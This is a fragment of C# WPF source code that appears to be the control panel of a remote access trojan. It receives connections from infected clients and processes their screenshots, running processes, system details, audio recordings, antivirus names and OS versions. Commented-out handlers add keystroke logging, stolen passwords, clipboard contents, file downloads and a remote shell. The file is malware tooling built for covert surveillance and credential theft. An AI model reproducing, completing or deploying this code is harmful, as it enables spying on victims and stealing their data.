                        new ObservableValue(3),
                        new ObservableValue(5),
                        new ObservableValue(6),
                        new ObservableValue(7),
                        new ObservableValue(3),
                        new ObservableValue(4),
                        new ObservableValue(2),
                        new ObservableValue(5),
                        new ObservableValue(8),
                        new ObservableValue(3),
                        new ObservableValue(5),
                        new ObservableValue(6),
                        new ObservableValue(7),
                        new ObservableValue(3),
                        new ObservableValue(4),
                        new ObservableValue(2),
                        new ObservableValue(5),
                        new ObservableValue(8)
                    }
                }
            };
            _trend = 0;
            Task.Factory.StartNew(() =>
            {
                Action action = delegate
                {
                    LastHourSeries[0].Values.Add(new ObservableValue(_trend));
                    LastHourSeries[0].Values.RemoveAt(0);
                    SetLecture();
                };
                while (true)
                {
                    _trend = 0;
                    Thread.Sleep(1000);
                    System.Windows.Application.Current.Dispatcher.Invoke(DispatcherPriority.Normal, action);
                }
            });
        }
        public  void GetRecievedData()
        {
            Task.Factory.StartNew(() =>
            {
                Action action = delegate
                {
                    Message Data;
                    while (MainServer.GetNextMessage(out Data))
                    {
                        switch (Data.eventType)
                        {
                            case EventType.Connected:
                                string ClientAddress = MainServer.GetClientAddress(Data.connectionId);

                                //foreach (string BlockedConnection in lbBlackList.Items)
                                //{
                                //    if (ClientAddress == BlockedConnection)
                                //    {
                                //        MainServer.Send(Data.connectionId, Encoding.ASCII.GetBytes("KillClient"));
                                //        await Task.Delay(50);
                                //        try
                                //        {
                                //            MainServer.Disconnect(Data.connectionId);
                                //        }
                                //        catch { }

                                //    }

                                //}
                                Clients.Add(new WpfApp15.Model.Program.Client(Data.connectionId, ClientAddress, "N/A", "N/A", "N/A"));
                                break;
                            case EventType.Disconnected:
                                for (int n = Clients.Count - 1; n >= 0; --n)
                                {
                                    if (Clients[n].Id.ToString().Contains(Data.connectionId.ToString()))
                                    {
                                        Clients.Remove(Clients[n]);
                                    }
                                }
                                break;
                            case EventType.Data:
                                HandleData(Data.connectionId, Data.data);
                                break;
                        }
                    }
                };
                while (true)
                {
                    _trend = 0;
                    System.Windows.Application.Current.Dispatcher.Invoke(DispatcherPriority.Normal, action);
                }
            });

        }
        public System.Drawing.Image ByteArrayToImage(byte[] ByteArrayIn)
        {
            IUnsafeCodec UC = new UnsafeStreamCodec(100);
            using (var MS = new MemoryStream(ByteArrayIn))
            {
                try
                {
                    return UC.DecodeData(MS);
                }
                catch
                {
                    return null;
                }
            }
        }
        public static byte[] ComputerInfo;
        public static byte[] ProcessFromClient;
        public void HandleData(int ConnectionId, byte[] RawData)
        {
            //ClientRunningApps CRA;
            byte[] ToProcess = RawData.Skip(1).ToArray();
            //Process type of data
            switch (RawData[0])
            {
                case 0: //Image Type
                    ImageToDisplay = ByteArrayToImage(ToProcess);
                    break;

                case 1: //Notification Type
                    MessageBox.Show(Encoding.ASCII.GetString(ToProcess), "Notification", MessageBoxButton.OK,
                        (MessageBoxImage)MessageBoxIcon.Information);
                    break;

                case 2: //Client Tag Type
                    AddClientTag(ConnectionId, Encoding.ASCII.GetString(ToProcess));
                    break;

                case 3: //Process Type
                    UpdateRunningApps(ToProcess);
                    break;

                case 4: //Information Type
                    ComputerInfo = ToProcess;
                    InfoComp = true;
                    var ComputerInformation = Activator.CreateInstance<ComputerInformation>();
                    ComputerInformation.Show();
                    ComputerInformation.Activate();
                    break;

                case 5: //File List Type
                    //UpdateFiles(ConnectionId, Encoding.ASCII.GetString(ToProcess), "");
                    break;

                case 6: //Current Directory Type
                    //UpdateCurrentDirectory(ConnectionId, Encoding.ASCII.GetString(ToProcess));
                    break;

                case 7: //Directory Up Type
                    //UpdateCurrentDirectory(ConnectionId, Encoding.ASCII.GetString(ToProcess));
                    //if (FE.Visible && FE.Text == "File Explorer - " + ConnectionId)
                    //    MainServer.Send(ConnectionId,
                    //        Encoding.ASCII.GetBytes("GetDF{" + FE.txtCurrentDirectory.Text + "}"));
                    break;

                case 8: //File Type
                    //if (FE.Visible && FE.ConnectionID == ConnectionId)
                    //{
                    //    File.WriteAllBytes(TempDataHelper.DownloadLocation, ToProcess);
                    //    Process.Start("explorer.exe", Environment.CurrentDirectory + @"\Downloaded Files\");
                    //    TempDataHelper.DownloadLocation = "";
                    //    AutoClosingMessageBox.Show("Download completed.", "Download Completed", 1000);
                    //}

                    break;

                case 9: //Clipboard Text Type
                    //UpdateClipboardTextViewer(ConnectionId, Encoding.ASCII.GetString(ToProcess));
                    break;

                case 10: //Hardware Usage Type
                    //UpdateHardwareUsage(ConnectionId, Encoding.ASCII.GetString(ToProcess));
                    break;

                case 11: //Keystroke Type
                    //UpdateKeylogger(ConnectionId, Encoding.ASCII.GetString(ToProcess));
                    break;

                case 12: //Current Window Type
                    //UpdateCurrentWindow(ConnectionId, Encoding.ASCII.GetString(ToProcess));
                    break;

                case 13: //Audio Recording Type
                    Audio = ToProcess;
                    break;

                case 14: //Anti-Virus Tag
                    AddAntiVirus(ConnectionId, Encoding.ASCII.GetString(ToProcess));
                    break;

                case 15: //Windows Version Tag
                    AddOperatingSystem(ConnectionId, Encoding.ASCII.GetString(ToProcess));
                    break;

                case 16: //Message Type
                    CreateChat();
                    break;

                case 17: //Passwords Type
                    //AddPasswords(ConnectionId, Encoding.ASCII.GetString(ToProcess));
                    break;

                case 18: //Remote Shell Type
                    //UpdateRemoteShell(ConnectionId, Encoding.ASCII.GetString(ToProcess));
                    break;
            }
        }

        private void CreateChat()
        {
            if (ChatActive == false)
            {
                var ComputerInformation = Activator.CreateInstance<ChatWindow>();
                ComputerInformation.Show();
                ComputerInformation.Activate();
            }
            ChatActive = true;
        }

        private void UpdateRunningApps(byte[] ToProcess)
        {
            ProcessFromClient = ToProcess;
            if (ProcessAppActive == false)
            {
                var ComputerInformation = Activator.CreateInstance<ProcessForm>();
                ComputerInformation.Show();
                ComputerInformation.Activate();
            }
            ProcessAppActive = true;
        }
        #endregion
    }
}
